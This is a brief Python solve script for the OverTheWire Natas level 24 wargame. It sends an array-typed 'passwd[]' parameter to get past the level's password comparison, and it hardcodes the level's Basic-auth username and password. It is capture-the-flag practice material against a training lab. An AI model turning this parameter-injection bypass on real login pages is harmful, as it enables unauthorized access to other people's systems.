import requests
import string
from requests.auth import HTTPBasicAuth

# debug=true to get the complete query string in the result
url = 'http://natas24.natas.labs.overthewire.org/?passwd[]=0'
response = ''
# base auth
auth = HTTPBasicAuth('natas24', 'OsRmXFguozKpTZZ5X14zNO43379LZveg')

# setup a new session
session = requests.Session()
response = session.post(url, auth = auth)
text = response.text
if('credentials' in text):
    print(text)

